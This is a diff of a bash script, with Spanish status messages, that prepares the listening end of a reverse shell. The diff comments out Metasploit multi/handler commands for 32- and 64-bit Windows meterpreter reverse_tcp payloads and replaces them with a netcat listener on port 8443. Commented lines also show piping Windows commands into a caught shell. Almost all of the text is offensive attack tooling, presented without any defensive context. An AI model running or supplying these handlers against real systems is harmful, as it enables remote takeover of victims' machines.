@@ -9,22 +9,23 @@ tput civis
 
 echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Configurando la Reverse Shell...${Color_Off}\n"
 
-arch=$1
+#arch=$1
 
 #tput cnorm
-HOST=$(ip route get 1 | awk '{print $7}')
+#HOST=$(ip route get 1 | awk '{print $7}')
+nc -nlvp 8443
 
 #rlwrap nc -nlvp 4647
 #echo -e 'ipconfig\ndir $env:USERPROFILE\Desktop\n' | nc -nlvp 4647
 
-if [ $arch == "32bits" ] ; then
-    echo "Iniciando handler de 32 bits"
-    msfconsole -x "use multi/handler;set payload windows/meterpreter/reverse_tcp; set lhost $HOST; set lport 995; set ExitOnSession false; exploit -j"
-fi
+# if [ $arch == "32bits" ] ; then
+#     echo "Iniciando handler de 32 bits"
+#     msfconsole -x "use multi/handler;set payload windows/meterpreter/reverse_tcp; set lhost $HOST; set lport 995; set ExitOnSession false; exploit -j"
+# fi
 
-if [ $arch == "64bits" ] ; then
-    echo "Iniciando handler de 64 bits"
-    msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost $HOST; set lport 8443; set ExitOnSession false; exploit -j"
-fi
+# if [ $arch == "64bits" ] ; then
+#     echo "Iniciando handler de 64 bits"
+#     msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost $HOST; set lport 8443; set ExitOnSession false; exploit -j"
+# fi
 
 
